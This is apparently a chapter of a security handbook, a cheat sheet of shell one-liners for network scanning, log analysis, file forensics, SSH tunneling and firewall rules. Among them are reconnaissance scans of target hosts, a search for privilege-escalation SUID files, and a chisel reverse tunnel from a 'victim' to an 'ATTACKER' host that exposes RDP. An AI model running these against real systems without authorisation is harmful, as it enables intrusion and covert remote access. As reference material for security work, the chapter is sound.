## 💡 Chapter XI — Shell One-Liners & Cheat Sheets

> *"One line to rule them all."*

### Network Reconnaissance

```bash
# Fast port scan with Nmap — top 1000 ports, OS detection, service version, script scan
nmap -sV -sC -O -T4 --top-ports 1000 -oN scan.txt <TARGET_IP>

# UDP top-20 scan
nmap -sU --top-ports 20 <TARGET_IP>

# Network sweep — discover live hosts
nmap -sn 192.168.1.0/24

# Masscan — scan all 65535 TCP ports at 10k pps
masscan -p1-65535 --rate=10000 <TARGET_IP>

# tcpdump — capture HTTP traffic to file
tcpdump -i eth0 -w capture.pcap port 80 or port 443

# tcpdump — show packets from specific host in ASCII
tcpdump -i eth0 -A host <TARGET_IP>

# Display all listening ports and their owning processes
ss -tulnp

# Show active network connections (Linux)
netstat -antp | grep ESTABLISHED

# DNS resolution with all record types
dig ANY <DOMAIN> @8.8.8.8

# Reverse DNS lookup
dig -x <IP_ADDRESS>

# Enumerate subdomains with subfinder and pipe to httpx for live hosts
subfinder -d target.com -silent | httpx -silent -status-code -title

# Check if common ports are open using bash built-ins (no tools needed)
for port in 21 22 23 25 80 443 445 3389 8080; do
  (echo >/dev/tcp/<TARGET>/$port) &>/dev/null && echo "$port OPEN"
done
```

### Log Analysis & Parsing

```bash
# Count unique IPs from a web access log
awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -rn | head 20

# Extract failed SSH login attempts with source IPs
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn

# Find top URLs hit in access log
awk '{print $7}' /var/log/nginx/access.log | sort | uniq -c | sort -rn | head 20

# Extract HTTP 4xx/5xx errors
grep -E ' (4|5)[0-9]{2} ' /var/log/nginx/access.log | awk '{print $9}' | sort | uniq -c | sort -rn

# Tail logs and grep for specific pattern in real-time
tail -f /var/log/syslog | grep --line-buffered "error"

# Parse JSON logs with jq — extract specific field from all records
cat app.log | jq -r '.message' | grep ERROR

# Count events per hour from syslog timestamps
awk '{print $1,$2,$3}' /var/log/syslog | cut -c1-14 | sort | uniq -c

# Search compressed log archives without extracting
zgrep "suspicious_pattern" /var/log/syslog.*.gz

# Extract Windows Event Log IOCs from CSV export (EventID 4624 - Logon)
grep ",4624," Security.csv | awk -F',' '{print $5,$7,$18}' | sort | uniq -c | sort -rn

# Find all cron jobs across all users
for user in $(cut -f1 -d: /etc/passwd); do crontab -l -u "$user" 2>/dev/null | grep -v "^#"; done
```

### File Forensics & Integrity

```bash
# Generate SHA256 hash of all files recursively
find /path/to/dir -type f -exec sha256sum {} \; > hashes.txt

# Check file integrity against a baseline
sha256sum -c hashes.txt

# Find SUID/SGID files — common privilege escalation vectors
find / -perm /6000 -type f 2>/dev/null

# Find world-writable files
find / -perm -o+w -not -type l 2>/dev/null

# Find files modified in last 24 hours
find / -mtime -1 -type f 2>/dev/null

# Find files larger than 100MB
find / -size +100M -type f 2>/dev/null

# Extract strings from a binary (min 6-char strings)
strings -n 6 malware.exe | grep -E '(http|ftp|C2|cmd|exec)'

# Identify file type regardless of extension
file -b suspicious_file

# Recursively calculate entropy of files (detect packed/encrypted content)
find . -type f | while read f; do echo "$(python3 -c "
import math, collections, sys
data=open('$f','rb').read()
c=collections.Counter(data)
e=-sum((v/len(data))*math.log2(v/len(data)) for v in c.values())
print(f'{e:.2f}')
") $f"; done | sort -rn | head 20

# Dump all readable strings from memory dump
strings -el memory.dmp | grep -E 'https?://'
```

### Encoding & Crypto One-Liners

```bash
# Base64 encode / decode
echo "secret_data" | base64
```

### SSH & Tunneling

```bash
# Local port forward — reach remote service via localhost
ssh -L 8080:REMOTE_HOST:80 user@JUMP_HOST

# Remote port forward — expose local service to remote host
ssh -R 9090:localhost:3000 user@REMOTE_HOST

# Dynamic SOCKS5 proxy (for proxychains)
ssh -D 1080 -N user@PROXY_HOST

# SSH through a jump host (ProxyJump)
ssh -J user@JUMPHOST user@TARGET

# Copy SSH public key to remote host
ssh-copy-id -i ~/.ssh/id_ed25519.pub user@TARGET

# Keep SSH alive and reconnect automatically with autossh
autossh -M 20000 -N -L 8080:TARGET:80 user@JUMP_HOST

# Run a command on remote host without interactive shell
ssh user@host "ps aux | grep apache"

# SSH tunnel with chisel (listener on attacker, connect from victim)
# Attacker:
chisel server --port 9000 --reverse
# Victim:
chisel client ATTACKER:9000 R:3389:127.0.0.1:3389
```

### iptables / Firewall Cheat Sheet

```bash
# List all rules with line numbers
iptables -L -n -v --line-numbers

# Block an IP address
iptables -A INPUT -s <MALICIOUS_IP> -j DROP

# Block an IP range (CIDR)
iptables -A INPUT -s 10.0.0.0/8 -j DROP

# Allow only specific ports (INPUT chain)
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT
iptables -A INPUT -j DROP

# Rate-limit SSH connections (anti-brute force)
iptables -A INPUT -p tcp --dport 22 -m limit --limit 3/min --limit-burst 5 -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -j DROP

# Log dropped packets
iptables -A INPUT -j LOG --log-prefix "iptables-DROP: " --log-level 4
iptables -A INPUT -j DROP

# Save rules
iptables-save > /etc/iptables/rules.v4

# Flush all rules (CAUTION — removes all firewall rules)
iptables -F && iptables -X && iptables -Z
```
